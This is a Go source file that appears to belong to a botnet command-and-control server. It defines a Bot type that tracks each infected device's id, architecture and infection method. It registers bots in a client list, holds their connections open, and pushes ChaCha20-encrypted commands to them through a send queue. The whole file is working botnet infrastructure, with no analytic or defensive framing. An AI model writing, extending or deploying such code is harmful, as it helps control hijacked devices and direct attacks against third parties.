package main

import (
	"fmt"
	"math/rand"
	"net"
	"time"
)

type Bot struct {
	uid             int
	conn            net.Conn
	id              string
	arch            string
	infectionMethod string
	sendQueue       chan []byte
}

func NewBot(conn net.Conn, id string, arch string, infectionMethod string) *Bot {
	return &Bot{
		uid:             -1,
		conn:            conn,
		id:              id,
		arch:            arch,
		infectionMethod: infectionMethod,
		sendQueue:       make(chan []byte, 100), // Buffer of 100 commands
	}
}

func (this *Bot) Handle() {
	clientList.AddClient(this)
	defer clientList.DelClient(this)

	// Start writer goroutine
	go this.writer()

	buf := make([]byte, 1)
	for {
		this.conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		_, err := this.conn.Read(buf)
		if err != nil {
			return
		}
	}
}

func (this *Bot) writer() {
	for buf := range this.sendQueue {
		this.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := this.conn.Write(buf); err != nil {
			this.conn.Close() // Close connection on write error
			return
		}
	}
}

func (this *Bot) QueueBuf(buf []byte) {
	nonce := make([]byte, 12)
	for i := 0; i < 12; i++ {
		nonce[i] = byte(rand.Intn(256))
	}

	encrypted, err := ChaCha20Encrypt(buf, []byte(EncKey), nonce)
	if err != nil {
		fmt.Println("Encryption Error:", err)
		return
	}

	// Non-blocking send: if queue is full, drop packet (prevent server freeze)
	select {
	case this.sendQueue <- append(nonce, encrypted...):
	default:
		// Queue full, client too slow, drop packet
	}
}
